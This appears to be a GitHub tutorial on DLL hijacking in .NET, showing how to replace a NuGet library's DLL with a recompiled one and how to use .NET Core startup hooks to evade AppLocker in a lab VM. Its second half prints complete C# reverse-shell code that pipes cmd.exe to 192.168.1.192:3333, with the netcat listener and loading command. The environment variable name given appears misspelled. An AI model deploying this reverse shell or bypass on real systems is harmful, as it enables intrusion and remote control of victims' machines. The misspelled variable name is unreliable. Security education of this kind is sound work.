# DLL Hijacking in .NET
![image](https://user-images.githubusercontent.com/12537739/149156168-f2cbc972-d278-4595-ad9b-da1ad07bafcd.png)

A simple DLL file was the catalyst to the [most devastating cyberattack against the United States by nation-state hackers.](https://www.upguard.com/news/u-s-government-data-breach)

This breach demonstrates the formidable potency of DLL hijacking and its ability to dismantle entire organizations with a single infected file.

# What is DLL Hijacking?

>DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).

This can be replacing an existing dll that a program uses (easy in .NET) or finding for other ways to hijack the dll search path of the program.

# Objectives

We will be focusing on .NET Framework/Core dlls in this section.

1. Hijacking a .NET Dll directly
2. Hijacking Search Path Using Development Mode
3. Hijacking Search Path Using Probing Mode
4. Hijacking via .NET Core Startup Hooks


# Setup

This project involves a simple set up of a `.Net core console project`. We will then install a nuget package of your choice.

For this example, I have chose a nuget called `ObjectCloner`.

Do take note of the version of the dll used as hijacking requires a dll of the same version (at least for this example).

> Note: For .Net Framework, you can use Binding Redirects to insert a dll of a different version.


We have a simple code that uses the library's `DeepClone` method, which clones our object. Then we print both objects to the screen.
```cs
 class Program
    {
        static void Main(string[] args)
        {
            Person person = new Person("Razali");
            Person clonedPerson = ObjectCloner.ObjectCloner.DeepClone(person);

            Console.WriteLine($"{person.Name}={clonedPerson.Name}");
        }
    }

    public class Person
    {
        public Person(string name)
        {
            Name = name;
        }
        public string Name { get; set; }
    }
```

What we are more interested in is the program's dependency on the library `ObjectCloner`. 

Compile the program under release and see the `bin\release` directory.

![image](https://user-images.githubusercontent.com/12537739/149163082-cef9d434-e063-48a6-a733-265e7945ed2c.png)


We notice that there exist a dll called `ObjectCloner.dll`. Our objective is to hijack this dll and insert our malicious code.

# Hijacking a .NET Dll directly

For this section, we will be taking a look at replacing the existing dll with a malicious one. To keep things simple for now, we are going to inject code to simply open up `calc.exe`.

As .NET dlls are only MSIL code and not machine code, we can easily reverse it to get the full source. For example, we can use `ilspy.exe` to open `ObjectCloner.dll` and view the source code.

![image](https://user-images.githubusercontent.com/12537739/149341620-747f5dcf-dc85-4035-9bc2-1f0e721bfdd9.png)

`ILSpy` makes it easy for us to save the reverse source code as a project. Let's save the project as `MaliciousObjectCloner`.

![image](https://user-images.githubusercontent.com/12537739/149341811-131d839a-7a7a-4662-ab97-d0232b0022ea.png)

The dll has been successfully reversed and saved as a project. Let's proceed to open the project in visual studio add code to open up `calc.exe`.

I have simply added `Process.Start()` to open up `calc.exe`.

![image](https://user-images.githubusercontent.com/12537739/149342591-4e5506cf-1337-4601-ad23-21cf82501e82.png)

Next, we are going to recompile this project in release version.

![image](https://user-images.githubusercontent.com/12537739/149342725-9aff8fea-b84a-411f-a96f-318e25889b83.png)

![image](https://user-images.githubusercontent.com/12537739/149342027-904b7af8-3b4c-40d3-9201-e3de9b0c48a3.png)

![image](https://user-images.githubusercontent.com/12537739/149342956-a24a8865-2f18-4925-8287-9ed87215aa9a.png)

Once we have our new `ObjectCloner.dll`, we can simply replace the other `ObjectCloner.dll` in our `DLLHijacking` project.

![image](https://user-images.githubusercontent.com/12537739/149343321-06a7aa96-fd46-461c-a617-6b19aae728cf.png)

Now launching `DLLHijacking.exe` executes `ObjectCloner`'s `DeepClone` method which we changed to invoke `calc.exe`.

DLL Hijacking success!

# Hijacking via .NET Core Startup Hooks

Starting from .Net Core 3.x, even .Net 5 and .Net 6, microsoft allows us to specify Startup procedures before our `Main` function runs. 

> This would allow hosting providers to define custom configuration and policy in managed code, including settings that potentially influence load behavior of the main entry point such as the AssemblyLoadContext behavior. The hook could be used to set up tracing or telemetry injection, to set up callbacks for handling Debug.Assert (if we make such an API available), or other environment-dependent behavior. The hook is separate from the entry point, so that user code doesn't need to be modified.

More info regarding Startup Hooks can be seen [here](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md).

A `Startup Hook` has to have 
1. No Namespaces
2. Class name is `StartupHook`
3. Implement the static method `public static void Initialize()`.

In this demo, we have a `Win10 VM` with `Applocker` enabled with the default rules. In addition, the Applocker has a rule that allows a particular folder to run executables.

> Do remember to run the 'gpupdate /Force' command if you have added a new applocker rule.

As we can see, running the executable from the `Desktop` directory is blocked by Applocker.

![image](https://user-images.githubusercontent.com/12537739/149789288-fc19d934-0c97-477c-b4ae-93ccbacda21c.png)

Running it from the `Allowed` folder gives us a console windows that simply prints `Hello World!`

Now lets prepare our `Startup Hook`!

We are going to create a reverse shell to the host machine at `192.168.1.192`.

```cs
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

internal class StartupHook
{

    public static StreamWriter streamWriter;

    public static void Initialize()
    {
        string logfilePath = "shellcode_log.txt";
        File.WriteAllText(logfilePath, "started..");


        int delay = 3000;
        string ip = "192.168.1.192";
        int port = 3333;
        var debugMessage = $"Connecting to {ip}:{port} in {delay / 1000} seconds...";
        Console.WriteLine(debugMessage);
        File.AppendAllText(logfilePath, debugMessage);

        try
        {
            using (TcpClient client = new TcpClient(ip, port))
            {

                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process process = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                RedirectStandardInput = true
                            },

                        };
                        process.OutputDataReceived += new DataReceivedEventHandler(OutputDataReceivedHandler);
                        process.Start();
                        process.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            process.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);

        }
    }

  private static void OutputDataReceivedHandler(object sendingProcess, DataReceivedEventArgs outLine)
  {
    StringBuilder strOutput = new StringBuilder();

    if (!String.IsNullOrEmpty(outLine.Data))
    {
        try
        {
            strOutput.Append(outLine.Data);
            streamWriter.WriteLine(strOutput);
            streamWriter.Flush();
        }
        catch (Exception err) { }
    }
  }
}



```

Basically inside our `Initialize` static method, we have dumped our reverse shell code in it. 

The full code example can also be retrieved in this repo under the `Hook` project.

Proceed to compile the project as a `Class Library` and we will end up with a `Hook.dll`.

![image](https://user-images.githubusercontent.com/12537739/149790561-2f211a86-efd2-44ff-8422-39fbe7df70d1.png)

Let's copy our `Hook.dll` into the `VM`'s `Desktop` folder. 

> Remember, the `Desktop` folder is restricted to execute any executables. But it doesn't matter as we can bypass it using this hooking method.

Now let's start a `netcat` session in our host and listen to port `3333` which is configured in our `hook.dll` to connect.

![image](https://user-images.githubusercontent.com/12537739/149791028-904b0dd4-15f7-4b88-a5a6-0752e6f00dfb.png)

Next in our `VM`, lets run the following command to set our environment variable to set our `Startup Hook`.

```sh
C:\Users\NormalUser\Desktop\Allowed> set DOT_NET_STARTUP_HOOKS=C:\Users\NormalUser\Desktop\Hook.dll
```

Lastly we simply run our program.

We have just pawned Applocker!
